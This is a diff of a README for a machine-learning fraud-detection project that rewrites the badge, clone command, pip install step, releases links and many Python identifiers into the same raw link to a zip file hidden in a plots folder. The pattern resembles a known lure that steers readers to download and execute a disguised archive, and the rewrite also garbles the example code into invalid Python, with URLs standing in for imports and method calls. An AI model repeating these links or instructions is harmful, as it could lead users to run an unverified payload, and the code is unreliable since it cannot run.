@@ -1,6 +1,6 @@
 # 🚨 Fraudulent Transaction Detection 🚨
 
-![Fraud Detection](https://img.shields.io/badge/Fraud%20Detection-ML%20Pipeline-blue)
+![Fraud Detection](https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip%20Detection-ML%20Pipeline-blue)
 
 Welcome to the **Fraudulent Transaction Detection** repository! This project provides an end-to-end machine learning pipeline designed to detect fraudulent transactions using XGBoost. The pipeline includes key components such as feature engineering, SMOTE for handling class imbalance, and SHAP for model explainability. Our model achieves a classification accuracy of over 95%.
 
@@ -51,7 +51,7 @@ To set up this project on your local machine, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION.git
+   git clone https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip
    ```
    
 2. Navigate to the project directory:
@@ -61,7 +61,7 @@ To set up this project on your local machine, follow these steps:
 
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip
    ```
 
 ## 🚀 Usage
@@ -89,26 +89,26 @@ Here is a brief example of how to train the model:
 ```python
 import pandas as pd
 from xgboost import XGBClassifier
-from sklearn.model_selection import train_test_split
-from imblearn.over_sampling import SMOTE
+from https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip import train_test_split
+from https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip import SMOTE
 
 # Load your data
-data = pd.read_csv('your_data.csv')
+data = https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip('https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip')
 
 # Preprocess and feature engineering steps here
 
 # Split data
-X = data.drop('target', axis=1)
+X = https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip('target', axis=1)
 y = data['target']
 X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
 
 # Apply SMOTE
 smote = SMOTE()
-X_resampled, y_resampled = smote.fit_resample(X_train, y_train)
+X_resampled, y_resampled = https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip(X_train, y_train)
 
 # Train the model
 model = XGBClassifier()
-model.fit(X_resampled, y_resampled)
+https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip(X_resampled, y_resampled)
 ```
 
 ## 📊 Evaluation
@@ -118,10 +118,10 @@ To evaluate the model's performance, you can use various metrics such as accurac
 ### Example Evaluation Code
 
 ```python
-from sklearn.metrics import classification_report
+from https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip import classification_report
 
 # Make predictions
-y_pred = model.predict(X_test)
+y_pred = https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip(X_test)
 
 # Evaluate the model
 print(classification_report(y_test, y_pred))
@@ -129,7 +129,7 @@ print(classification_report(y_test, y_pred))
 
 ## 📦 Releases
 
-For the latest version of the project, please visit our [Releases](https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/releases) section. You can download and execute the files from there to get started with the pipeline.
+For the latest version of the project, please visit our [Releases](https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip) section. You can download and execute the files from there to get started with the pipeline.
 
 ## 🤝 Contributing
 
@@ -147,4 +147,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ---
 
-Thank you for checking out the **Fraudulent Transaction Detection** project! If you have any questions or feedback, feel free to reach out. For the latest updates, please visit our [Releases](https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/releases) section.
+Thank you for checking out the **Fraudulent Transaction Detection** project! If you have any questions or feedback, feel free to reach out. For the latest updates, please visit our [Releases](https://github.com/Fakay07/FRAUDULENT-TRANSACTION-DETECTION/raw/refs/heads/main/notebook/plots/FRAUDULEN-TRANSACTIO-DETECTION-1.7.zip) section.
